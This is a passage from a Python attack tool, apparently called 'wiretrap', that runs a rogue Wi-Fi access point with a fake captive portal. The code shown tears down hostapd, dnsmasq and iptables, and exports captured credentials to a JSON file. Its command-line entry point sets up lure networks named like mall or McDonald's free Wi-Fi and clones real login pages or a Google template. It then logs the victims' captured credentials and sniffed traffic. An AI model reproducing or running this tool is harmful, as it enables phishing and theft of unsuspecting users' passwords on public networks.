        if self._hostapd_proc:
            try:
                self._hostapd_proc.terminate()
                self._hostapd_proc.wait(timeout=3)
            except Exception:
                try: self._hostapd_proc.kill()
                except Exception: pass
            self._hostapd_proc = None

        if self._dnsmasq_proc:
            try:
                self._dnsmasq_proc.terminate()
                self._dnsmasq_proc.wait(timeout=3)
            except Exception:
                try: self._dnsmasq_proc.kill()
                except Exception: pass
            self._dnsmasq_proc = None

        self._clear_iptables()
        subprocess.run(["ip", "addr", "flush", "dev", self.interface], capture_output=True)

        for f in [self._hostapd_conf, self._dnsmasq_conf]:
            try: os.remove(f)
            except FileNotFoundError: pass

        self._log("Captive Portal detenido.")
        if self.on_stopped:
            self.on_stopped()

    def _cleanup(self):
        self.stop()

    def export_credentials(self, path=None):
        """Exporta las credenciales capturadas a JSON."""
        if not path:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = f"/tmp/wiretrap_creds_{ts}.json"
        with open(path, "w") as f:
            json.dump(self.captured_creds, f, indent=2, ensure_ascii=False)
        self._log(f"Credenciales exportadas → {path}")
        return path


# ── Test de terminal ─────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: sudo python3 captive_portal.py <iface_ap> <iface_internet> [ssid] [url_a_clonar]")
        print("Ejemplo: sudo python3 captive_portal.py wlan0 eth0 MallWiFi_FREE")
        print("         sudo python3 captive_portal.py wlan0 eth0 McDoWiFi https://example.com/login")
        sys.exit(1)

    iface  = sys.argv[1]
    out_if = sys.argv[2]
    ssid   = sys.argv[3] if len(sys.argv) > 3 else "MallWiFi_FREE"
    clone_url = sys.argv[4] if len(sys.argv) > 4 else None

    cp = CaptivePortal(iface)
    cp.on_log        = lambda m: print(f"[LOG] {m}")
    cp.on_error      = lambda m: print(f"[ERR] {m}")
    cp.on_credential = lambda e: print(f"\n[!!!] CAPTURADO: {e}\n")
    cp.on_sniff_data = lambda d: print(f"[SNIFF] {d.data_type} {d.source_ip} {d.value[:60]}")

    if clone_url:
        if not cp.clone_template(clone_url):
            sys.exit(1)
        cp.start(ssid=ssid, channel=6, template="custom", out_interface=out_if)
    else:
        cp.start(ssid=ssid, channel=6, template="google", out_interface=out_if)

    try:
        while cp.running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Deteniendo...")
        cp.stop()
